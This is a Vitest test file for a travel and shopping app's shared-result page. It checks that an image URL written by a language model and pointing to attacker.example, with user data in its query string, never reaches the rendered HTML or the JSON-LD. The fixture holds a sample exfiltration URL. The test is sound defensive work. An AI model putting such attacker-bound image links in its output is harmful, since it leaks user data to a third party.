// @vitest-environment jsdom
//
// Gate 2 G3 (G-T4) — /r/<slug> rendered to static HTML through the REAL loader from a stored OLD snapshot whose `images` carry a copy
// of the model-written plan photo. Nothing in the HTML — the hero gallery, the shopping card's hero fallback (`images[0]`), or the
// JSON-LD script — may carry it; the valid hero image must still render.
import { describe, it, expect, vi } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh'
const HERO = 'https://cdn.example/hero.jpg'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const stored = {
  id: 'id-1', slug: 'AbCdEfGh12', query: 'q', domain: 'travel', locale: 'vi', og_version: 1, view_count: 0, ask_count: 0,
  created_at: '2026-10-01T00:00:00.000Z', parent_id: null, owner_is_anonymous: false,
  payload: {
    v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [],
    images: [EXFIL, HERO, TBN], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
    plan: { type: 'trip', title: 'Đà Lạt 2 ngày', people: 2, budget_total: '', days: [{ label: 'Ngày 1', items: [
      { time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', description: '', price: '', photo_url: EXFIL },
      { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ Xuân Hương', description: '', price: '', photo_url: TBN },
    ] }] },
    // A shopping view whose recommended entity has no image: ShoppingDecision falls back to `heroImage = images[0]`.
    shopping: { v: 1, entities: [{ key: 'k1', name: 'Tai nghe X', config: 'X', specs: [], condition: null, matchesRequest: 'khop', recommended: true, priceLow: null, priceHigh: null, image: null, offers: [{ seller: 'Shop', url: 'https://shop.example/x', price: null, currency: 'VND', condition: null }] }], recommendation: null },
  },
}
vi.mock('@/lib/supabase/admin', () => ({
  createAdminClient: () => {
    const chain = { select: () => chain, eq: () => chain, maybeSingle: async () => ({ data: JSON.parse(JSON.stringify(stored)), error: null }) }
    return { from: () => chain }
  },
}))
vi.mock('./PublicResultClient', () => ({ default: () => null }))
vi.mock('@/components/messaging/NewMessageSheet', () => ({ default: () => null }))
vi.mock('@/lib/share/renderCardImage', () => ({ renderArtifactImage: async () => null }))

import SharedResultPage from './page'

const render = async () => renderToStaticMarkup(await SharedResultPage({ params: { slug: 'AbCdEfGh12' } }))
const jsonLdOf = (html: string) => [...html.matchAll(/<script type="application\/ld\+json"[^>]*>([\s\S]*?)<\/script>/g)].map(m => m[1]).join('\n')

describe('G3 · /r/<slug> HTML (G-T4)', () => {
  it('the page HTML carries no trace of the rejected plan photo anywhere', async () => {
    expect(await render()).not.toContain('attacker.example')
  })
  it('the JSON-LD script lists only allowed images', async () => {
    const ld = jsonLdOf(await render())
    expect(ld.length).toBeGreaterThan(0)
    expect(ld).not.toContain('attacker.example')
    expect(ld).toContain('cdn.example/hero.jpg')
  })
  it('the hero gallery and the shopping hero fallback show the valid image', async () => {
    const html = await render()
    const srcs = [...html.matchAll(/<img[^>]+src="([^"]+)"/g)].map(m => m[1].replace(/&amp;/g, '&'))
    expect(srcs).toContain(HERO)
    expect(srcs).toContain(TBN)
    expect(srcs.filter(s => s === HERO).length, 'gallery + shopping hero fallback').toBeGreaterThanOrEqual(2)
  })
})
